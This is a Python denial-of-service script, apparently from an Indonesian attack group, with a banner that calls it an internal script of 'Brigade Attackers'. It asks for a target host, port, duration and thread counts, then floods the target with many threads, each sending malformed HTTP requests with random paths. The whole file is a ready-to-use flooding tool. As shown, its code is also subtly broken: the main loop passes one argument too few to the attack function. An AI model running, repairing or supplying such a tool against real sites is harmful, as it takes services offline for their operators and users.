# CHECK IMPORT
try:
    import socket
    import threading
    import string
    import random
    import time
    import os
    import platform
    import sys
    from colorama import Fore
except ModuleNotFoundError as e:
    print(f"{e} CAN'T IMPORT . . . .")
    exit()

# DEF & CLASS

def clear_text():
    if platform.system().upper() == "WINDOWS":
        os.system('cls')
    else:
        os.system('clear')

def status_print(ip,port,thread_id,rps,path_get):
    print(f"{Fore.YELLOW}FLOODING {Fore.LIGHTYELLOW_EX}HTTP{Fore.WHITE} {Fore.WHITE}---> {Fore.BLUE}TARGET{Fore.WHITE}={ip}:{port} {Fore.LIGHTBLUE_EX}PATH{Fore.WHITE}={path_get} {Fore.CYAN}RPS{Fore.WHITE}={rps} {Fore.LIGHTCYAN_EX}ID{Fore.WHITE}={thread_id}{Fore.RESET}")
    print(f"{Fore.YELLOW}FLOODING {Fore.LIGHTYELLOW_EX}HTTP{Fore.WHITE} {Fore.WHITE}---> {Fore.BLUE}TARGET{Fore.WHITE}={ip}:{port} {Fore.LIGHTBLUE_EX}PATH{Fore.WHITE}={path_get} {Fore.CYAN}RPS{Fore.WHITE}={rps} {Fore.LIGHTCYAN_EX}ID{Fore.WHITE}={thread_id}{Fore.RESET}")
    print(f"{Fore.YELLOW}FLOODING {Fore.LIGHTYELLOW_EX}HTTP{Fore.WHITE} {Fore.WHITE}---> {Fore.BLUE}TARGET{Fore.WHITE}={ip}:{port} {Fore.LIGHTBLUE_EX}PATH{Fore.WHITE}={path_get} {Fore.CYAN}RPS{Fore.WHITE}={rps} {Fore.LIGHTCYAN_EX}ID{Fore.WHITE}={thread_id}{Fore.RESET}")
def generate_url_path_pyflooder(num):
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, int(num)))
    return data
    
def generate_url_path_choice(num):
    letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
    data = ""
    for _ in range(int(num)):
        data += random.choice(letter)
    return data

# DOS
def DoS_Attack(ip,host,port,type_attack,id,booter_sent,data_type_loader_packet):
    rps = 0
    url_path = ''
    path_get = ['PY_FLOOD','CHOICES_FLOOD']
    path_get_loader = random.choice((path_get))
    if path_get_loader == "PY_FLOOD":
        url_path = generate_url_path_pyflooder(5)
    else:
        url_path = generate_url_path_choice(5)
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        if data_type_loader_packet == 'PY' or data_type_loader_packet == 'PYF':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n".encode()
        elif data_type_loader_packet == 'OWN1':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\r\r".encode()
        elif data_type_loader_packet == 'OWN2':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\r\r\n\n".encode()
        elif data_type_loader_packet == 'OWN3':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n".encode()
        elif data_type_loader_packet == 'OWN4':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n".encode()
        elif data_type_loader_packet == 'OWN5':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n\r\r\r\r".encode()
        s.connect((ip,port))
        for _ in range(booter_sent):
            s.sendall(packet_data)
            s.send(packet_data)
            rps += 2
    except:
        try:
            s.shutdown(socket.SHUT_RDWR)
            s.close()
        except:
            pass
    status_print(ip,port,id,rps,path_get_loader)

status_code = False
id_loader = 0
def runing_attack(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet):
    global status_code,id_loader
    if status_code == True:
        while time.time() < time_loader:
            for _ in range(spam_loader):
                id_loader += 1
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent,data_type_loader_packet))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent,data_type_loader_packet))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent,data_type_loader_packet))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent,data_type_loader_packet))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent,data_type_loader_packet))
                th.start()
    else:
        threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet)).start()

#DATA
banner = f"""
{Fore.BLUE}████████▒▒ ██▒▒        ████▒▒     ███▒▒  ██████▒▒
{Fore.BLUE}██▒▒       ██▒▒      ██▒ ██▒▒  ██▒  ██▒▒██▒▒  ██▒▒
{Fore.BLUE}██▒▒       ██▒▒     ██▒▒   ██▒▒██▒▒  ██▒▒██▒▒   ██▒▒
{Fore.BLUE}██▒▒       ██▒▒     ██▒▒   ██▒▒██▒▒  ██▒▒██▒▒   ██▒▒
{Fore.CYAN}██████▒▒   ██▒▒     ██▒▒   ██▒▒██▒▒  ██▒▒██▒▒   ██▒▒
{Fore.CYAN}██▒▒       ██▒▒      ██▒   ██▒▒  ██▒▒██▒▒ ██▒▒ ██▒▒
{Fore.CYAN}██▒▒       ████████▒▒ ████▒▒     ████▒▒   ██████▒▒
{Fore.CYAN}▒▒▒        ▒▒ ▒▒ ▒▒   ▒▒ ▒▒      ▒ ▒▒     ▒▒▒▒▒
{Fore.CYAN}▒▒          ▒ ▒ ▒      ▒ ▒        ▒▒        ▒▒
{Fore.RED}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{Fore.RED}┣{Fore.WHITE}            BRIGADE ATTACKERS ZNEEPER ELITE
{Fore.RED}┣{Fore.GREEN}                     INTERNAL SCRIFT
{Fore.RED}┣{Fore.YELLOW}                       BY: KF'24
{Fore.RED}┣{Fore.BLUE}                          —oO0Oo—
{Fore.RED} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
===>> 35 DETIK UNTUK MEMULAI SERANGAN...!! <==={Fore.RESET}"""

print(banner)
host = ""
ip = ""
target_loader = input(f"{Fore.LIGHTYELLOW_EX}IP/URL==⟩⟩ {Fore.WHITE} ")
port_loader = int(input(f"{Fore.YELLOW}PORT==⟩⟩ {Fore.YELLOW} "))
time_loader = time.time() + int(input(f"{Fore.GREEN}TIME (DEFAULT=200)==⟩⟩ {Fore.WHITE} "))
spam_loader = int(input(f"{Fore.BLUE}SPAM THREAD (DEFAULT=50 OR 250)==⟩⟩ {Fore.YELLOW} "))
create_thread = int(input(F"{Fore.CYAN}CREATE THREAD (DEFAULT=35)==⟩⟩ {Fore.WHITE}"))
booter_sent = int(input(F"{Fore.GREEN}BOOTER SENT (DEFAULT=500)==⟩⟩ {Fore.WHITE} "))
print(f"{Fore.YELLOW} EXAMPLE HTTP METHODS> CONNECT GET POST HEAD ")
print(f"{Fore.CYAN}EXAMPLE CUSTOM HTTP METHODS> CLOUDFLARE AGE PYFLOODER GATEWAY")
methods_loader = input(F"{Fore.LIGHTBLUE_EX}HTTP_METHODS (EXAMPLE=GATEWAY)>")
print(f"{Fore.MAGENTA}TRYING TO GET IP:PORT {Fore.LIGHTMAGENTA_EX}. . .{Fore.RESET}")
try:
    host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
    ip = socket.gethostbyname(host)
except socket.gaierror:
    exit()
for loader_num in range(create_thread):
    sys.stdout.write(f"\r {Fore.YELLOW}{loader_num} CREATE THREAD . . .{Fore.RESET}")
    sys.stdout.flush()
    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
clear_text()
print(banner)
status_code = True
print(f"{Fore.GREEN}MULAI MENYERANG . . .{Fore.RESET}")
